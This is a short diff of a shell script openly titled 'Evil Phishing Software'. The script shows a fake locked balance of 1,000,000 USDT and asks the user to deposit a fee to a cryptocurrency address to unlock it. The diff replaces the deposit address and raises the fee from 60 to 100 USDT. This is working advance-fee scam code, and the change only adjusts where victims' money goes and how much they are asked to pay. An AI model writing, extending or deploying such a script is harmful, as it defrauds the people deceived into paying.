@@ -3,7 +3,7 @@
 # Evil Phishing Software
 
 balance=1000000
-hash_id="TKx9hFn59obAjVPLNvjXJtqAjMbjSqaHoy"
+hash_id="TT5AihU5AuL8R2sApVnZpPQKLHUrYeziiu"
 
 usdt_logo="
 \033[0;34m$$$$$$\
@@ -32,7 +32,7 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 60 USDT to the following address: $hash_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $hash_id"
 
 function unlockBalance {
     read -p "Enter your deposit amount in USDT: " depositAmount
